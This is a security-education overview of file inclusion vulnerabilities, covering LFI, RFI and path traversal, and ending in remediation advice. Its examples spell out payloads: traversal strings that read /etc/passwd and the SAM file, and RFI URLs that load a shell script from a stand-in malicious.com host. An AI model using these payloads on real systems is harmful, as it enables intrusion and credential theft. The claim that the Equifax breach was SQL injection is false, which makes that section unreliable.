# File Inclusion Overview

## File Inclusion Overview

### High-Level Summary

_**File Inclusion Vulnerabilities**_ occur when applications improperly handle user input to include files dynamically. This can lead to severe consequences like **information disclosure**, **remote code execution**, or **privilege escalation**. File inclusion vulnerabilities arise due to poor input validation, lack of access controls, and improper path handling. These vulnerabilities are categorized into:

* _**Local File Inclusion (LFI)**_: Including files already present on the server.
* _**Remote File Inclusion (RFI)**_: Including files from external sources via URLs.
* _**Path Traversal**_: Accessing files outside the intended directory by manipulating paths.

***

### Definition Bank

| **Term**                        | **Definition**                                                                                                | **Example**                                                                        |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| **File Inclusion**              | A mechanism for including files into a main script, often using directives like `include` or `require`.       | Including configuration files or templates dynamically in PHP or Python.           |
| **Local File Inclusion (LFI)**  | Exploiting a file inclusion vulnerability to include files already on the server.                             | Reading `/etc/passwd` via path manipulation in Unix-based systems.                 |
| **Remote File Inclusion (RFI)** | Exploiting a file inclusion vulnerability to include files from external sources via URLs.                    | Including a malicious script hosted on an attacker-controlled server.              |
| **Path Traversal**              | A vulnerability where attackers manipulate paths to access unauthorized files outside the intended directory. | Using `../../../../etc/passwd` to traverse directories and access sensitive files. |
| **Absolute Path**               | A full path to a file or directory from the root of the filesystem.                                           | `/var/www/html/config.php`.                                                        |
| **Relative Path**               | A path relative to the current working directory.                                                             | `../config.php` or `../../etc/passwd`.                                             |

***

### Understanding Key Concepts

#### File Inclusion in Modular Design

Modern applications are often modular to improve maintainability and scalability. This means:

* Applications are broken into components based on functionality (e.g., configurations, templates).
* Files are dynamically included using mechanisms like `include` (PHP), `import` (Python), or `require` (Node.js).

***

### How File Inclusion Vulnerabilities Occur

1. **Improper Input Validation**:
   * **Problem**: When file paths are constructed using unsanitized user input.
   * **Effect**: Allows attackers to manipulate the input to include unintended files.
2. **Lack of Access Controls**:
   * **Problem**: Absence of proper restrictions on directories or file access.
   * **Effect**: Attackers can access sensitive files like configurations or logs.

***

### Categories of File Inclusion Vulnerabilities

#### Local File Inclusion (LFI)

* **What it is**: Exploiting the inclusion mechanism to load files already on the server.
* **Impact**:
  * **Information Disclosure**: Reading sensitive files like `/etc/passwd`.
  * **Server-Side Code Execution**: Including log files containing malicious payloads.
  * **Privilege Escalation**: Accessing configuration files with admin credentials.

**Example Payload**:

```php
http://example.com/index.php?file=../../../../etc/passwd
```

***

#### Remote File Inclusion (RFI)

* **What it is**: Exploiting the inclusion mechanism to load files from external URLs.
* **Impact**:
  * **Remote Code Execution**: Running attacker-hosted malicious scripts.
  * **Data Theft**: Exposing sensitive application data to attackers.

**Example Payload**:

```php
http://example.com/index.php?file=http://malicious.com/shell.php
```

***

#### Path Traversal

* **What it is**: Manipulating file paths to access files outside the intended directory.
* **Impact**:
  * **Information Disclosure**: Reading files like `config.php` or `/etc/passwd`.
  * **Access Control Bypass**: Navigating outside restricted directories.

**Example Payloads**:

```plaintext
../../../../etc/passwd
..\\..\\..\\..\\windows\\system32\\config\\SAM
```

***

### Real-World Impact

* **Equifax Data Breach (2017):** While primarily an SQL injection vulnerability, the attack demonstrated how improper input validation and poor access controls could lead to massive data exposure. Similar issues exist in file inclusion vulnerabilities.
* **CVE-2019-18952 (Webmin):** A remote file inclusion vulnerability in Webmin allowed attackers to execute arbitrary commands by injecting malicious URLs.
* **Multiple WordPress Plugins (Ongoing):** Poorly implemented file inclusion mechanisms in WordPress plugins frequently result in LFI and RFI vulnerabilities, enabling attackers to gain unauthorized access or execute arbitrary scripts.

***

### Attack Scenarios

#### Local File Inclusion (LFI) Example

```php
http://example.com/index.php?page=../../../../etc/passwd
```

* The application does not properly validate user input, allowing traversal outside the intended directory.
* If successful, the attacker retrieves system files, potentially exposing credentials and configuration details.

#### Remote File Inclusion (RFI) Example

```php
http://example.com/index.php?page=http://malicious.com/shell.txt
```

* The attacker provides a URL pointing to a malicious script, which the application executes, leading to remote code execution.

***

### Remediation Strategies

1. **Input Validation & Sanitization**
   * Restrict input to expected file names and extensions.
   * Use allowlists rather than blocklists to enforce safe inputs.
2. **Enforce Secure File Handling**
   * Use absolute paths instead of relying on user input.
   * Restrict file inclusion to specific directories using settings like `open_basedir` (PHP) or sandboxed file access controls.
3. **Disable Remote File Inclusion**
   * If RFI is not required, disable functions that allow URL-based inclusion (e.g., `allow_url_include=Off` in PHP).
4. **Monitor and Log Access Attempts**
   * Implement logging and alerting mechanisms to detect unusual file access patterns.
   * Regularly audit logs for suspicious inclusion attempts.
5. **Apply Principle of Least Privilege**
   * Limit file permissions to prevent unauthorized read or execution access.
   * Ensure web application users have minimal access rights.

***

#### Conclusion

File inclusion vulnerabilities pose a significant threat to web applications, often leading to sensitive data disclosure or full system compromise. Secure coding practices, strict input validation, and proper access controls are essential in mitigating these risks. Regular security assessments, including vulnerability scanning and penetration testing, help identify and remediate these vulnerabilities before exploitation occurs.
